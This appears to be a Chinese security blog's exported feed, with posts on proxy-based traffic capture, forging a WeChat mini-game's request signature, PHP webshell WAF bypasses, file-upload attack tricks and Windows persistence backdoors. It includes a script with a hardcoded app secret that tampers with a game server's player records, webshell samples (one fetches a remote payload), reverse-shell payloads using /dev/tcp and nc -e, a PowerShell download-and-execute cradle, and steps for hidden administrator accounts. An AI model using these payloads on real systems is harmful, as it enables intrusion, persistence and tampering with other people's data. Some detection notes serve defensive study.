    <content type="text"><![CDATA[0x01 Proxifier代理介绍首先介绍下Proxifier： Proxifier是一款功能非常强大的代理客户端，支持Windows XP/Vista/Win7/Win10 和 MacOS，支持http/https、socks4/5、TCP、UDP等协议，可以指定端口，指定IP，指定域名、指定程序、指定用户名密码授权等运行模式，兼容性非常好，有点类似SOCKSCAP。 有许多网络应用程序不支持通过代理服务器工作，不能用于局域网或防火墙后面。这些会损害公司的隐私和导致很多限制。Proxifier解决了这些问题和所有限制，让您有机会不受任何限制使用你喜爱的软件。 此外，它让你获得了额外的网络安全控制，创建代理隧道，并添加使用更多网络功能的权力。 代理流程主要分为两步： 1、添加代理服务器 2、设置代理规则（设置需要代理的应用程序） 这样，只要选择需要代理的应用程序，比如chrome.exe，即可实现代理流量转发 0x02 安卓模拟器全局代理现在部分安卓客户端会设置很多种方法来验证客户端是否使用了代理，来防止抓包。 比如： 检查是否使用了Http代理，如果是，那么客户端不再发送网络请求 通过Okhttp设置默认代理 使用okhttp实现SSL双向认证 。。。 如果在APP请求网络之前先判断下手机网络是否使用了代理，如果使用了代理就不请求接口，那么我们就无法抓取数据包进行分析了。 安卓模拟器大多是使用virtualbox的虚拟网卡进行的网络通信，那么，如果直接将模拟器的网络进程的所有流量代理到burpsite即可抓取流量包，同时又绕过了关于客户端的相关校验。 打开模拟器分析网络进程，会发现模拟器使用的网络进程有：virtualbox headless fronrend和NoxVMHandle Frontend。 这里以夜神模拟器为例 总体流程图如下： 2.1 设置Proxifier代理服务器代理服务器设置为burp监听端口。 2.2 设置代理规则将NoxVMHandle Frontend进程对应的应用程序文件加入代理规则。 2.3 抓取流量包配置之后，即可在proxifier中获取到模拟器内对应app的流量 安装证书之后，即可在burp中看到proxifier转发过来的流量 同样的道理，该流量转发方法同样适用C/S客户端测试]]></content>
      <tags>
        <tag>抓包</tag>
        <tag>微信</tag>
        <tag>小程序</tag>
        <tag>客户端</tag>
        <tag>Filder</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[渗透测试之微信小程序破解]]></title>
    <url>%2F2019%2F08%2F07%2F%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%A0%B4%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[在移动互联的时代，手机端业务越来越多，最普遍的就是微信小程序。最近项目测试的时候发现现在的程序员的安全意识越来越好，很多业务都采用了签名来校验数据包，这样，如果不知道sign算法的话对于安全测试人员来说就无法修改数据，也就无法得知漏洞是否存在了。 本次以一个微信小游戏为例，第一次尝试，发现后面水很深，要学的好多，先学习个简单的，走个流程先。 微信小游戏：消灭病毒 0x01 抓包打开游戏-&gt;抓包 手机抓包就不再详细说了，如果抓不到数据包，网上搜下方法。 按照常规操作，修改个数据，发现返回错误代码 1&#123;"code":1000&#125; 还原原始数据，发现正常返回 1&#123;"data":&#123;&#125;,"code":0&#125; 后续试了下，发现不论哪个字段，只要数据包被篡改就返回错误。 看到最后的sign字段，然后也没有session、cookie等身份校验的字段，基本上就是因为sign校验不通过导致的。 所以，只要知道了sign算法，应该就可以直接篡改数据了 0x02 获取wxapkg文件使用模拟器（ROOT）打开微信，搜索小程序。 可能会有打不开、闪退的情况，但是不要紧，因为资源已经被下载下来了。 之前不知道，一直没办法获取源码，后来网上搜到个神器，使用“RE管理器”可以读取到对应的文件目录。 安装完之后，打开小程序，然后在“RE管理器”里面打开目录：/data/data/com.tencent.mm/MicroMsg/ 这一大串随机字符串就是微信目录了，打开目录：/appbrand/pkg 这里面就是我们安装的小程序的源码包 0x03 反编译wxapkg获取源文件Github上已经有大神写的node.js版本的，当然也有其它版本的，例如python版本，不用管什么版本的，能用就行了。 GitHub地址： https://github.com/qwerty472123/wxappUnpacker 进入到下载好的反编译脚本目录下，在node命令窗口中依次安装需要的依赖。 项目中列出来的需要安装的依赖不全，如果报错，看下issues就行了，下面是在我能运行状态下安装的依赖。 123456789101112131415161718192021222324252627282930313233343536373839/Users/w2n1ck/Desktop/wx/wxappUnpacker├─┬ css-tree@1.0.0-alpha.34│ ├── mdn-data@2.0.4│ └── source-map@0.5.7├── cssbeautify@0.3.1├── esprima@4.0.1├─┬ js-beautify@1.10.1│ ├─┬ config-chain@1.1.12│ │ ├── ini@1.3.5│ │ └── proto-list@1.2.4│ ├─┬ editorconfig@0.15.3│ │ ├── commander@2.20.0│ │ ├─┬ lru-cache@4.1.5│ │ │ ├── pseudomap@1.0.2│ │ │ └── yallist@2.1.2│ │ ├── semver@5.7.0│ │ └── sigmund@1.0.1│ ├─┬ glob@7.1.4│ │ ├── fs.realpath@1.0.0│ │ ├─┬ inflight@1.0.6│ │ │ └── wrappy@1.0.2│ │ ├── inherits@2.0.4│ │ ├─┬ minimatch@3.0.4│ │ │ └─┬ brace-expansion@1.1.11│ │ │ ├── balanced-match@1.0.0│ │ │ └── concat-map@0.0.1│ │ ├── once@1.4.0│ │ └── path-is-absolute@1.0.1│ ├─┬ mkdirp@0.5.1│ │ └── minimist@0.0.8│ └─┬ nopt@4.0.1│ ├── abbrev@1.1.1│ └─┬ osenv@0.1.5│ ├── os-homedir@1.0.2│ └── os-tmpdir@1.0.2├─┬ uglify-es@3.3.9│ ├── commander@2.13.0│ └── source-map@0.6.1├── vm2@3.8.2 然后运行运行脚本 1node wuWxapkg.js &lt;file&gt; 这样就成功获取到该小程序的源代码了 0x04 源码分析因为开始我们已经知道上传的接口是：api/archive/upload 一个文件中都有四5万行代码，一行一行分析的话，太浪费时间了（主要是我也看不懂，2333…） 所以，我是根据特征直接在源码中搜的 定位到具体位置 可以看到数据包都经过了sign处理 然后搜索关键字：sign 可以看到t中包含的所有的字段属性和我们抓包时候的一样，基本上可以确认就是这个了。同时，在传输数据的时候，将wx_appid、wx_secret删除了 搜索关键字：zn，定位具体函数 可以看到就是使用了md5进行了加密。 0x05 脚本编写根据源码看到，sign是将post的所有字段和wx_appid、wx_secret一起进行了md5加密，这样，sign的算法已经知道了。 但是，死活没有在源码中找到两个变量，网上搜索，发现新版本是动态加载的，然后我在“微信开发者工具”中导入源码之后一直卡在85%，没办法运行，也就导致没办法动态调试获取到wx_appid、wx_secret的变量值了。 随后网上搜了下这个游戏的破解文章，发现早期版本的代码中是直接硬编码这两个变量的，后面试了下，没想到还能用。 这样就全部都有了，写个脚本，根据修改后的数据生成对应的sign即可。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849# -*- coding: utf-8 -*-import hashlibimport jsonimport timeimport requestsdef get_sign(data): if 'sign' in data: data.pop('sign') items = list(data.items()) items.append(('wx_appid', 'wxa2c324b63b2a9e5e')) items.append(('wx_secret', '8fbd540d0b23197df1d5095f0d6ee46d')) items.sort() _data = "" for key, value in items: _data += (key + "=" + str(value) + "&amp;") _data = _data[:-1] return hashlib.md5(_data.encode('utf-8')).hexdigest()def request_action(action, **kws): url = 'https://wxwyjh.chiji-h5.com/api/archive/&#123;&#125;'.format(action) data = &#123; 'plat': 'wx', 'time': int(time.time() * 1000), &#125; data.update(kws) data['sign'] = get_sign(data) r = requests.post(url, json=data) data = r.json() if data['code'] == 0: print('[ * ] &#123;&#125; OK.'.format(action)) return datadef get_record(openid): r = request_action('get', openid=openid) record = json.loads(r['data']['record']) return recordif __name__ == '__main__': uid = 'xxxx' record = get_record(uid) record['money'] = '9999999999' record['zuanShi'] = '9000' openid = record['uid'] record['sign'] = get_sign(record) record = json.dumps(record) request_action('upload', openid=openid, record=record) new_record = get_record(uid) print(new_record) 看下效果图： 至此，我们就可以达到任意篡改数据的目的了。 当然，看到那些排行榜的用户不爽的话，直接将他们的数据改到解放前（openid在源码中能找到），哈哈哈… PS：以上想法纯属意淫，请勿当真！！！ 谨以此文献给我那位“为了升级打怪天天看广告”的兄弟.]]></content>
      <tags>
        <tag>微信</tag>
        <tag>小程序</tag>
        <tag>破解</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[基于PhantomJS的动态爬虫引擎]]></title>
    <url>%2F2019%2F05%2F21%2F%E5%9F%BA%E4%BA%8EPhantomJS%E7%9A%84%E5%8A%A8%E6%80%81%E7%88%AC%E8%99%AB%E5%BC%95%E6%93%8E%2F</url>
    <content type="text"><![CDATA[之前学习爬虫的时候一直了解、学习的是基于PhantomJS的，虽然Chrome的headless更加优秀、比PhantomJS更快、占用内存更少，而且还有个强大的爸爸。但是也不能把之前的学的给荒废了，先实践下再说，况且这种东西大部分应该是都是互通的。 PhantomJS 是无界面的 Webkit 解析器，提供了 JavaScript API 。由于去除了可视化界面，速度比一般 Webkit 浏览器要快很多。同时提供了很多监控和事件接口，可以方便的操作 DOM 节点，模拟用户操作等。 1. 爬虫功能爬虫主要需要具备的基本功能： javascript动态解析能力 hook所有的网络请求 静态页面链接、表单自动分析能力 自动交互能力 1.1 静态页面链接和表单自动分析phantomjs提供page.evaluate，这个方法会创建一个“沙盒”来解析javascript。所以，我们可以在沙盒中执行javascript代码，以此获得静态页面链接和表单 1.2 javascript动态解析phantomjs在打开url的时候就会自动使用自己的webkit内核去执行对应的javascript代码，从而可以实现js动态解析 1.3 hook所有的网络请求phantomjs使用page.onResourceRequested方法来hook所有的网络请求，所以可以在这个函数里面截获ajax请求，获取url和对应的参数 1.4 自动交互爬虫的自动交互能力就是需要获取页面所有事件，并想办法触发事件，最后获取事件触发的结果。 页面中的事件一般分两种： 内联事件：比如，on开头的事件onxxx、javascript:xxx 绑定事件：比如，document.addEventListener、jQuery中的$(&#39;dom&#39;).xxx 自动交互事件即用户交互事件，而用户操作的本质，实际上是触发了绑定在DOM节点的事件。所以自动触发问题，可以简化为触发节点事件。 分解下自动触发事件的三个步骤，逐步实现 1、获取事件 2、触发事件 3、获取事件触发结果 2.1 内敛事件获取内敛事件：遍历节点，获取所有节点内的onxx属性和javascript:属性值 触发内敛事件：调用eval执行所有的onxxxx属性和javascript:属性的值 2.2 绑定事件：获取绑定事件：JavaScript中绑定事件，都会调用addEventListener函数，所以我们可以用hook addEventListener的办法来获取绑定事件：onInitialized 触发绑定事件：JavaScript中提供了dispatchEvent函数，可以触发指定DOM节点的指定事件 2.3 获取事件触发结果等待页面加载完之后，需要获取所有的&lt;a&gt;、&lt;iframe&gt;、&lt;form&gt;等标签，开启页面DOM节点监听，并且触发所有的事件。 12345678获取form表单属性和值获取a标签的href值获取link标签的href值获取area标签的href值获取img标签的src值获取embed标签的src值获取video标签的src值获取audio标签的src值 2. 代码实现具体代码如下： 注意项： 所有必要的header头 根据表单属性类型，自动填写对应类型的表单数值 根据后缀禁止静态资源的加载，因为如果根据Content-Type判断将导致结果目录树不全 尽量获取所有标签中的链接，比如图片，视频等，因为可能存在SSRF、XSS、文件包含等漏洞 不触发注销、删除等敏感接口 hook会导致页面阻塞的函数，比如alert、prompt等 有待完善。。。 3. 实例测试这里以demo.aisec.cn为测试站点。 看下效果： 从图中看出获取的的链接有： 12345静态标签: http://demo.aisec.cn/demo/aisec/html_link.php?id=2JS解析 http://demo.aisec.cn/demo/aisec/js_link.php?id=2&amp;msg=abcForm表单: http://demo.aisec.cn/demo/aisec/post_link.phpAjax请求: http://demo.aisec.cn/demo/aisec/ajax_link.php?id=1&amp;t=010451811132952571自动交互: http://demo.aisec.cn/demo/aisec/click_link.php?id=2 后面还要做的太多了。。。慢慢来吧。 🙄️ 参考链接http://blog.wils0n.cn/archives/18/ https://github.com/wilson9x1/crawler_phantomjs/blob/master/crawler.js https://stackoverrun.com/cn/q/9189682 http://dogewatch.github.io/2017/01/15/webSiteSpider/ https://github.com/DogeWatch/webSiteSpider/blob/master/phantomjs.js https://www.anquanke.com/post/id/85298 https://www.anquanke.com/post/id/95294 https://security.tencent.com/index.php/blog/msg/34 http://phantomjs.org/api/webpage/ WEB 2.0 启发式爬虫实战|阿里云猪猪侠]]></content>
      <tags>
        <tag>爬虫</tag>
        <tag>扫描器</tag>
        <tag>PhantomJS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP常见过waf webshell及最简单检测方法]]></title>
    <url>%2F2019%2F05%2F20%2FPHP%E5%B8%B8%E8%A7%81%E8%BF%87waf-webshell%E5%8F%8A%E6%9C%80%E7%AE%80%E5%8D%95%E6%A3%80%E6%B5%8B%E6%96%B9%E6%B3%95%2F</url>
    <content type="text"><![CDATA[之前在Webshell查杀的新思路中留了一个坑🙄️，当时没有找到具体找到全部变量的方法，后来通过学习找到了个打印全部量的方法，并再次学习了下PHP webshell绕过WAF的方法，以此来验证下此方法是否合理。 如有错误，还请指出，不胜感激！ 🐢拜 在那篇文章中我突然想到一种检测webshell的方法，就是首先获取到当前文件中的所有变量（不明白的可以先去看下之前的文章），然后再根据正则库进行静态检测。 自认为这种方法虽然会检测不完全（每个检测机制都不能保障全部有效），但是感觉非常简单、实用，也没那么多高深的道理。 为了验证该检测机制，首先了解下目前PHP webshell绕过WAF的方法。 常见绕过WAF的PHP webshell字符串变形大小写、编码、截取、替换、特殊字符拼接、null、回车、换行、特殊字符串干扰 1234567891011121314151617181920212223&lt;?php$a = base64_decode("YXNzYXNz+00000____");$a = substr_replace($a,"ert",3);$a($_POST['x']);?&gt;ucwords()ucfirst()trim()substr_replace()substr()strtr()strtoupper()strtolower()strtok()str_rot13()chr()gzcompress()、gzdeflate()、gzencode()gzuncompress()、gzinflate()、gzdecode()base64_encode()base64_decode()pack()unpack() 自写函数利用assert() 123456&lt;?php function test($a)&#123; $a($_POST['x']);&#125;test(assert);?&gt; 回调函数123456789101112131415161718&lt;?php call_user_func(assert,array($_POST[x]));?&gt;call_user_func_array()array_filter() array_walk() array_map()registregister_shutdown_function()register_tick_function()filter_var() filter_var_array() uasort() uksort() array_reduce()array_walk() array_walk_recursive()forward_static_call_array() 类利用魔术方法、析构函数__destruct()，__construct() 1234567891011&lt;?php class test&#123; public $a = ''; function __destruct()&#123; assert("$this-&gt;a"); &#125;&#125;$b = new test;$b-&gt;a = $_POST['x'];?&gt; 利用外部文件利用curl, fsockopen等发起网络请求再结合file_get_contents 12345678&lt;?phperror_reporting(0);session_start();header("Content-type:text/html;charset=utf-8");if(empty($_SESSION['api']))$_SESSION['api']=substr(file_get_contents(sprintf('%s?%s',pack("H*",'687474703a2f2f7777772e77326e31636b2e636f6d2f7368656c6c2f312e6a7067'),uniqid())),3649);@preg_replace("~(.*)~ies",gzuncompress($_SESSION['api']),null);?&gt; 无字符特征马编码、异或、自增 123456&lt;?php$_=('%01'^'`').('%13'^'`').('%13'^'`').('%05'^'`').('%12'^'`').('%14'^'`'); // $_='assert';$__='_'.('%0D'^']').('%2F'^'`').('%0E'^']').('%09'^']'); // $__='_POST';$___=$$__;$_($___[_]); // assert($_POST[_]);?&gt; 特殊请求头利用getallheaders() 12345678&lt;?php$cai=getallheaders()['cai'];$dao=getallheaders()['dao'];if($cai!="" and $dao!="")&#123; $cai=gzuncompress(base64_decode($cai));$cai(gzuncompress(base64_decode($dao)));&#125;header('HTTP/1.1 404 Not Found');?&gt; 全局变量利用getenv()，arrag_flip()，get_defined_vars()，session_id() 12345678import requestsurl = 'http://localhost/?code=eval(hex2bin(session_id(session_start())));'payload = "phpinfo();".encode('hex')cookies = &#123; 'PHPSESSID':payload&#125;r = requests.get(url=url,cookies=cookies)print r.content PHP混淆加解密以phpjiami为例 就是将函数名、变量名全部变成”乱码”，且改动任意一个地方，都将导致文件不能运行。具体可访问：https://www.phpjiami.com/ PHP webshell检测方法目前我所了解的webshell检测方式有： 机器学习检测webshell：比如混淆度、最长单词、重合指数、特征、压缩比等 动态检测（沙箱） 基于流量模式检测webshell：agent 逆向算法+静态匹配检测webshell：比如D盾webshell查杀 根据文件入度出度来检测 实例展示这里以PHPjiami的webshell为例，其中2.php即为phpjiama的木马 可以明显看到明显的webshell规则了，这样再用静态规则、正则等即可轻松检测到。 简单检测思路检测思路： 文件上传-&gt;文件包含-&gt;获取所有文件中的变量到临时文件中-&gt;静态规则匹配临时文件-&gt;返回匹配结果 12345678910111213141516171819202122232425262728293031├── __init__.py├── conf│ ├── __init__.py│ ├── config.py├── core│ ├── __init__.py│ ├── all_check.py│ ├── data_mysql.py│ └── file_inotify.py├── lib│ ├── __init__.py│ └── semantic_analysis_api.py├── test│ ├── __init__.py│ ├── file_md5_move.py│ ├── os_check.py│ ├── random_file_test.py│ └── ...├── web│ ├── static│ │ ├── css│ │ │ ├── main.css│ │ ├── images│ │ │ └── background.jpg│ │ └── js│ │ └── upload.js│ ├── templates│ │ ├── index.html│ ├── upload_file.php│ └── include_file_to_tmp.php├── webshell_check.py conf中包含的是诸如下列的静态检测规则]]></content>
      <tags>
        <tag>WAF绕过</tag>
        <tag>PHP</tag>
        <tag>webshell</tag>
        <tag>后门</tag>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[渗透测试中文件上传技巧]]></title>
    <url>%2F2019%2F05%2F18%2F%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%8A%80%E5%B7%A7%2F</url>
    <content type="text"><![CDATA[上传文件名fuzz字典根据语言、解析漏洞、中间件、系统特性以及一些绕过WAF的方法：黑名单、大小写、ADS流、截断、空格、长度、htaccess等生存文件名字典。 Gayhub：https://github.com/c0ny1/upload-fuzz-dic-builder 上传excel文档进行CSV注入比较老了，学习下也没啥坏处 123=cmd|'/c calc'!A0=MSEXCEL|'\..\..\..\Windows\System32\cmd.exe /c calc.exe'!''=HYPERLINK("http://vpsip?test="&amp;A2&amp;A3,"Error: Please click me!") 上传excel、word进行xxe修改word、excel解压之后xml文件，加入payload Gayhub: https://github.com/BuffaloWill/oxml_xxe 在线生成: https://buer.haus/xxegen/ 上传mp4/avi利用ffmpeg文件读取/SSRF12345#EXTM3U#EXT-X-MEDIA-SEQUENCE:0#EXTINF:10.0,concat:http://xx.oo/header.m3u8|file:///etc/passwd#EXT-X-ENDLIST 上传imagemagic文件进行命令执行1234push graphic-contextviewbox 0 0 640 480fill 'url(https://oo.xx/1.jpg"|bash -i &gt;&amp; /dev/tcp/127.0.0.1/2233 0&gt;&amp;1")'pop graphic-context 上传Ghostscript文件进行命令执行123456%!PSuserdict /setpagedevice undeflegal&#123; null restore &#125; stopped &#123; pop &#125; iflegalmark /OutputFile (%pipe%$(nc -e /bin/sh 127.0.0.1 2333)) currentdevice putdeviceprops 上传svg文件进行ssrf1&lt;?xm l version="1.0" encoding="UTF-8" standalone="no"?&gt;&lt;svg xm lns:svg="http://www.w3.org/2000/svg" xm lns="http://www.w3.org/2000/svg" xm lns:xlink="http://www.w3.org/1999/xlink" width="200" height="200"&gt;&lt;image height="30" width="30" xlink:href="http://vps_ip.:2333/" /&gt;&lt;/svg&gt; 上传svg文件进行xss1"&gt;&lt;svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/&gt;"&gt;&lt;svg/onload=document.write(document.location)&gt; 上传webp后缀进行文件进行xss容器无法处理原因，其他后缀同理 1234567&lt;html&gt;&lt;body&gt;&lt;script&gt;alert('XSS')&lt;/script&gt;&lt;embed code="javascript:alert(1)" invokeurls="false" allownetworking="none" allowscriptaccess="never" loop="false" menu="false" play="false" type="application/x-shockwave-flash"&gt;&lt;IMG SRC=javascript:alert("XSS")&gt;&lt;/html&gt;&lt;/body&gt; 上传shtml进行SSI12345678&lt;html&gt;&lt;body&gt;&lt;embed code="javascript:alert(1)" invokeurls="false" allownetworking="none" allowscriptaccess="never" loop="false" menu="false" play="false" type="application/x-shockwave-flash"&gt;&lt;!--#exec cmd="/bin/ls /" --&gt;&lt;br/&gt;&lt;!--#exec cmd="cat /etc/passwd" --&gt;&lt;br/&gt;&lt;!--#exec cmd="find / -name *.* -print" --&gt;&lt;br/&gt;&lt;/html&gt;&lt;/body&gt; 上传html，phtml等进行XSS1234567&lt;html&gt;&lt;body&gt;&lt;script&gt;alert('XSS')&lt;/script&gt;&lt;embed code="javascript:alert(1)" invokeurls="false" allownetworking="none" allowscriptaccess="never" loop="false" menu="false" play="false" type="application/x-shockwave-flash"&gt;&lt;IMG SRC=javascript:alert("XSS")&gt;&lt;/html&gt;&lt;/body&gt; 对上传文件进行导出excel的地方插入payload进行csv注入12=cmd|' /C id'!A0@cmd|'/C id'!A0 上传文件时如果转换时比如转成PDF等文件，尝试在上传文件中加入payload进行SSRF123&lt;iframe src="file:///etc/passwd" width=400height=400/&gt;&lt;iframe src="file:///c:/windows/win.ini" width=400height=400/&gt;"&gt;&lt;svg/onload=document.write(document.location)&gt; 文件上传时，修改正在上传中的 input type 为URL，尝试SSRF1&lt;input type="file" id="upload_file" name="upload_file[]" class="file" size=1 multiple=""&gt; 改成 12&lt;input type="url" id="upload_file" name="upload_file[]" class="file" size=1 multiple=""&gt;&lt;?xml version="1.0" encoding="UTF-8" standalone="no"?&gt;&lt;svg xmlns:svg="http://www.w3.org/2000/svg" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200"&gt;&lt;image height="30" width="30" xlink:href="http://vpsip:2333/" /&gt;&lt;/svg&gt; 上传文件名XSS123&lt;img src=x onerror=alert(1)&gt;.png"&gt;&lt;img src=x onerror=alert(1)&gt;.png"&gt;&lt;svg onmouseover=alert(1)&gt;.svg 上传图片里面注入Code12exiv2 -c'A "&lt;?php system($_REQUEST['cmd']);?&gt;"!' backdoor.jpegexiftool "-comment&lt;=back.php" back.png 图片属性XSS1exiftool -Artist='"&gt;&lt;img src=1 onerror=alert(1)&gt;' poc.jpeg 上传文件名SQL注入1move_uploaded_file()上传文件时，把文件名更改为语句，可能会存在xss或者sql注入 IIS 7.0/IIS 7.5/ Nginx &lt;8.03畸形解析漏洞Nginx在默认Fast-CGI开启状况下,上传一个名字为poc.jpg，内容为： 1&lt;?PHP fputs(fopen('shell.php','w'),'&lt;?php eval($_POST[cmd])?&gt;');?&gt; 的文件，然后访问poc.jpg/.php,在这个目录下就会生成一句话木马 shell.php Apache解析漏洞上传的文件命名为 1test.php.x1.x2.x3 # Apache是从右往左判断后缀 Windows系统特性在windows环境下，xx.php[空格] 或xx.php.这类文件都是不允许存在的，若这样命名，windows会默认除去空格或点，可以通过抓包，在文件名后加一个空格或者点绕过黑名单。 上传.htaccess文件如果在Apache中.htaccess可被执行.且可被上传.那可以尝试在.htaccess中写入: 123&lt;FilesMatch "shell.jpg"&gt; SetHandler application/x-httpd-php &lt;/FilesMatch&gt;或者AddType application/x-httpd-php .png Windows下利用ADS流上传文件上传文件名为：1.php::$data IIS6截断1分号截断asp.asp;asp.jpg 双文件上传1filename="a.txt";filename="a.php" JSON利用参数中有存在json字符串，可以利用fastjson、jackson等漏洞利用 JSON数据包可以改成xml格式测试xxe漏洞将application/json改成application/xml 123&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;!DOCTYPE root [&lt;!ENTITY file SYSTEM "file:///etc/passwd"&gt;]&gt;&lt;root&gt;&amp;file;&lt;/root&gt; 上传PDF文件进行URL跳转PDF-&gt;页面属性-&gt;动作-&gt;打开网络链接-&gt;添加 上传目录可控，进行文件覆盖使用../进行目录切换 如有错误或不足，欢迎大佬不吝指正、补充。]]></content>
      <tags>
        <tag>渗透测试</tag>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux、Windows权限维持常用后门学习总结:windows篇]]></title>
    <url>%2F2019%2F03%2F27%2FLinux%E3%80%81Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%B8%B8%E7%94%A8%E5%90%8E%E9%97%A8%E6%80%BB%E7%BB%932%2F</url>
    <content type="text"><![CDATA[上一篇文章中学习了下linux下的一些权限维持常用的技术手段，Linux、Windows权限维持常用后门学习总结之Linux，接着学习下Windows下的常用技术手段。 MSF模块Metasploit自带有权限维持相关后门，常用的有：通过服务启动(metsvc)；通过启动项启动(persistence)；通过计划任务(scheduleme&amp;schtasksabuse)。 1234567891、生成payloadmsfvenom windows/meterpreter/reverse_tcp LHOST=192.168.2.11 LPORT=23333 X &gt;xx.exe2、监听msf&gt; use exploit/multi/handlerset payload windows/meterpreter/reverse_tcpset LHOST 192.168.2.11set LPORT 23333exploit3、运行payload就会获取到一个meterpreter shell Metsvc123456metsvc是通过服务启动，服务名是meterpreter。启动：meterpreter&gt; run metsvc -A移除：meterpreter&gt; run metsvc -r 检测及查杀 123AutorunsProcess ExplorerTCPView Persistence12345678910111213141516171819202122persistence是通过启动项启动meterpreter&gt; run persistence –X –i 50 –p 23333 –r 192.168.2.11（YOUR MSF IP）参数解析：-X 开机启动，注册表位置：HKLM\Software\Microsoft\Windows\CurrentVersion\Run-U 当用户登录时自启动，注册表位置：HKCU\Software\Microsoft\Windows\CurrentVersion\Run-S 作为服务启动，注册表位置：HKLM\Software\Microsoft\Windows\CurrentVersion\Run-L 后门传到远程主机的位置默认为%TEMP%-P 使用的Payload，默认windows/meterpreter/reverse_tcp，该默认的payload生成的后门为32位程序。因此，当目标机器为64位系统时，留下的后门将无法运行-i 连接超时时间 –p 端口 –r remoteIP当使用run persistence进行持久化时默认远程路径会推送到%TEMP%("C:\Users\AppData\Local\Temp\")。当用户重启或者temp目录下存在数字id，persistence持久化就会出错。meterpreter&gt; run persistence -S -i 5 -p 23333 -r 192.168.2.11 -L c:\\Windows\\System32该命令脚本注册自启动注册表位置：HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run可以使用如下命令查看注册表的Key：meterpreter&gt; reg enumkey -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run查询Valuesmeterpreter&gt; reg queryval -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v UxMvAJkbedJu除Valuesmeterpreter&gt; reg deleteval -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v MDxTmrUjRGnvIaT 检测及查杀 123检查注册表相关键值AutorunsProcess Monitor Scheduleme&amp;Schtasksabuse1234567scheduleme和schtasksabuse是通过利用计划任务启动meterpreter&gt; run scheduleme -m 1 -e /tmp/nc.exe -o "-e cmd.exe -L -p 8080"# 上传nc并创建计划任务每一分钟执行一次'nc -e cmd.exe -L -p 8080'meterpreter&gt; run schtasksabuse -t 192.168.2.7 -c "cmd /c calc.exe" -d 30# 每隔30秒执行一次calc.exe 检测及查杀 1Autoruns 计划任务无论是windows还是linux操作系统都提供计划任务功能，来实现定时或者周期性的执行一些指令。 12345678910图形化工具：taskschd.msc命令行工具：schtasks.exeSCHTASKS /parameter [arguments]/Create 创建新计划任务/Delete 删除计划任务/Query 显示所有计划任务/Run 运行计划任务/End 中止当前正在运行的计划任务Payload examples:&gt; SCHTASKS /Create /TN update /TR xx(待执行的命令) /DELAY ONLOGON /F /RL HIGHEST 检测及查杀 1Autoruns 影子账户影子账户是指除了在注册表里面有用户记录，其他地方都不存在用户的信息。net user或计算机管理里本地用户和用户组是看不到用户信息的，具有很好的隐蔽性质。 1234567891011121、用'$'创建匿名用户，并加到administrator组cmd&gt; net user admin$ 123456 /addcmd&gt; net localgroup administrators admin$ /add2、导出匿名用户对应的sam目录下的注册表键值cmd&gt; regedt32.exe打开HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users键值，然后找到admin$对应的类型以及文件夹，以及administrator对应的文件夹，将administrator文件夹中的F值内容复制到admin$对应文件夹F值中。PS：注意Sam键值在属性中给予administrator完全控制以及读取的权限，默认是不允许的3、删除匿名用户cmd&gt; net user admin$ /del4、还原匿名用户HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names\admin$双击导出的注册表文件，用先前导出的注册表键值对注册表进行修改，就可以重新还原之前的匿名用户 检测及查杀 1231、删除注册表HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\下对应帐户的键值2、隐藏帐户的登录记录，可通过查看日志获取注：工具HideAdmin能自动实现以上的创建和删除操作 PowerShell后门Empire框架1https://github.com/EmpireProject/Empire Schtasks-Backdoor1https://github.com/re4lity/Schtasks-Backdoor MSF1234567msf&gt; use exploit/multi/script/web_deliveryset payload windows/meterpreter/reverse_tcpset LHOST 192.168.2.11set target 2runPAYLOAD:powershell.exe -nop -w hidden -c $w=new-object net.webclient;$w.proxy=[Net.WebRequest]::GetSystemWebProxy();$w.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $w.downloadstring('http://192.168.2.11:8080/kaMhC1'); MOF1https://wooyun.js.org/drops/Powershell%E4%B9%8BMOF%E5%90%8E%E9%97%A8.html 注册表注册表可以理解为一个树状结构的数据库，它具有一些特殊的数据类型用来存储一些数据满足应用程序的需要。 名称 作用 HKEY_CLASSES_ROOT 用于存储一些文档类型、类、类的关联属性 HKEY_CURRENT_CONFIG 用户存储有关本地计算机系统的当前硬件配置文件信息 HKEY_CURRENT_USER 用于存储当前用户配置项 HKEY_CURRENT_USER_LOCAL_SETTINGS 用于存储当前用户对计算机的配置项 HKEY_LOCAL_MACHINE 用于存储当前用户物理状态 HKEY_USERS 用于存储新用户的默认配置项 Run/RunOnce KeysRun键值代表着开机启动项，也就是说在这个项下的键值会随着开机启动（这里的开机是指用户登录，也就是说只要有登录操作就会执行）。 RunOnce键值类似于 Run 键值，唯一的区别在于，RunOnce 键值只执行一次，操作执行后会被自动删除。 用户级 12HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunHKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce 管理员 123HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunHKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceHKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run 